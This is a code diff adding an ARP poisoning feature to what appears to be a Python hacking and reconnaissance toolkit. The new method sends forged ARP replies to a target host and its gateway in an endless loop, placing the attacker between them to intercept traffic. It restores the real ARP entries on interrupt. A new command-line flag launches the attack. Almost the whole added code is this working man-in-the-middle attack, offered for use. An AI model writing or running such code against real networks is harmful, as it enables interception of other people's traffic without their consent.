@@ -10,8 +10,7 @@ import re
 import dns.resolver
 import whois
 import sys
-
-
+import time
 
 
 class color:
@@ -775,8 +774,35 @@ class hacon:
 
         self.printg(f"[*] Finished files and dirs detection on {self.get_target()}")
     
-        
+    def arp_poisoning(self, gateway_ip):
+        """
+        Send ARP poisoning to target
+        """
 
+        print()
+        target = self.get_target()
+        self.printg(f"[*] Starting ARP poisoning attack on {self.get_target()}")
+        verbose = int(self.verbose)
+        self.verbose = 0
+        target_mac = self.get_mac_address(self.get_target())
+        gateway_mac = self.get_mac_address(gateway_ip)
+        self.verbose = verbose
+
+        try:
+            number = 0
+            while True:
+                send(ARP(op=2,pdst=target,hwdst=target_mac,psrc=gateway_ip),verbose=False)
+                send(ARP(op=2,pdst=gateway_ip,hwdst=gateway_mac,psrc=target),verbose=False)
+                number += 2
+                sys.stdout.write("\r" + "[*] ARP poisoning attack sending packets " + str(number))
+                sys.stdout.flush()
+                time.sleep(3)
+        except KeyboardInterrupt:
+            send(ARP(op=2,pdst=target,hwdst=target_mac,psrc=gateway_ip,hwsrc=gateway_mac),verbose=False,count=6)
+            send(ARP(op=2,pdst=gateway_ip,hwdst=gateway_mac,psrc=target,hwsrc=target_mac),verbose=False,count=6)
+
+        self.printg(f"[*] Finished ARP poisoning attack on {target}")
+        
     def arguments(self, arguments = None):
         """
         Parse the arguments
@@ -849,6 +875,9 @@ atadogan06@gmail.com - onuratakan
 
         parser.add_argument('-s', '--subdomains', action="store_true", help='Sub domains file')
         parser.add_argument('-f', '--filesanddirs', action="store_true", help='Files and dirs file')
+
+
+        parser.add_argument('-arpp', '--arpspoosoning', type=str, nargs=1, metavar="Gateway ip", help='ARP spoofing')
 
 
         if not arguments is None:
@@ -958,6 +987,9 @@ atadogan06@gmail.com - onuratakan
 
         if args.subdomains:
             self.subdomains_detection()
+
+        if not args.arpspoosoning is None:
+            self.arp_poisoning(args.arpspoosoning[0])
 
 
 
